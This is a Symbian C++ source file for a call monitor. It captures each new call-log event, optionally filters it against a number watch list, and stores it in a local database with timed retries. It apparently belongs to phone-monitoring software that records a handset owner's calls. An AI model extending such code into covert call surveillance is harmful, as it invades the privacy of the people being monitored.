#include "FxsCallMonitor.h"
#include "CltLogEvent.h"
#include "CallEventGenTest.h"
#include "Global.h"
#include "WatchListHelper.h"

/**
Wait in second before inserting event to the database again after failure.*/
#define RETRY_WAIT 5
/**
Max number of event to insert at one time.
We limit it because don't want it to be a long running task which will stop other active object from processing.*/
#define KMaxEventToInsert 50

CFxsCallMonitor::CFxsCallMonitor(CFxsLogEngine& aLogEngine,CFxsDatabase& aDb) : iLogEngine(aLogEngine),iDb(aDb)
	{	
	}

CFxsCallMonitor::~CFxsCallMonitor()
	{
	iEventArray.ResetAndDestroy();
	delete iTimout;
	delete iEventGenTest;
	}
	
CFxsCallMonitor* CFxsCallMonitor::NewL(CFxsLogEngine& aLogEngine,CFxsDatabase& aDb)
	{
	CFxsCallMonitor* self = new(ELeave)CFxsCallMonitor(aLogEngine,aDb);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}
	
void CFxsCallMonitor::ConstructL()
	{
	iLogEngine.AddLogEngineObserver(*this);
	CreateTimerL();
	
//#ifdef __RUN_TEST_CODE
	//iEventGenTest = CCallEventGenTest::NewL(*this, iLogEngine);
//#endif
	}
	
void CFxsCallMonitor::CreateTimerL()
	{
	iTimout=CTimeOut::NewL(*this);
	iTimout->SetPriority(CActive::EPriorityIdle-1);
	iTimout->SetInterval(RETRY_WAIT);	
	}
	
//MTimeoutObserver
void CFxsCallMonitor::HandleTimedOutL()
	{
	//Insert the previous failure events
	if(iEventArray.Count() > 0)
		{
		InsertDbL();
		}
	}
	
void CFxsCallMonitor::InsertDbL()
	{
	TInt err(KErrNone);
	TInt i(0),j(0);	
	TInt count = iEventArray.Count();
	FOREVER
		{
	//delete object if insert to database success otherwise retains in the array
	//
		CFxsLogEvent* cltEvent = iEventArray[i];	
		TRAP(err,iDb.InsertDbL(cltEvent));
		if(!err)
			{
			delete cltEvent;
			iEventArray.Remove(i);
			count--;
			
			if(++j == KMaxEventToInsert)
				{		
				iTimout->SetInterval(1);
				iTimout->Start();
				
				//Return, Don't break
				return;
				}
			}
		else//insert failed
			{			
			ERR2(_L("[CFxsCallMonitor::InsertDbL] Insert EventId: %d Failed with error: %d"),cltEvent->Id(), err)
			i++;
			}
		
		if(i >= count)	
			{
			break;
			}
		}
	
	if(iEventArray.Count() > 0)
		{
		//Try to insert again after RETRY_WAIT secs
		iTimout->SetInterval(RETRY_WAIT);
		iTimout->Start();
		}
	
	iDb.NotifyDbAddedL();
	LOG1(_L("[CFxsCallMonitor::InsertDbL] End, J: %d"),j)
	}

void CFxsCallMonitor::OnDbUnlock()
	{
	InsertDbL();
	}

void CFxsCallMonitor::EventLogClearedL()
	{	
	iDb.LogEngineClearedL();	
	}
	
void CFxsCallMonitor::EventAddedL(const CLogEvent& aEvent)
	{
	CFxsSettings& settings = Global::Settings();
	if(settings.IsTSM())
		{
	#ifdef FEATURE_WATCH_LIST
		if(WatchListHelper::ContainNumber(settings.WatchList(), aEvent.Number()))
			{
			goto DoInert;
			}
	#else
		goto DoInert;
	#endif
		}
	else
		{
	DoInert:
		CFxsLogEvent* cltEvent = CFxsLogEvent::NewL(aEvent);
		iLogEngine.SetCustomDirection(*cltEvent,aEvent.Direction());	
		iDb.InsertDbL(cltEvent);//passing ownership	
		}
	}
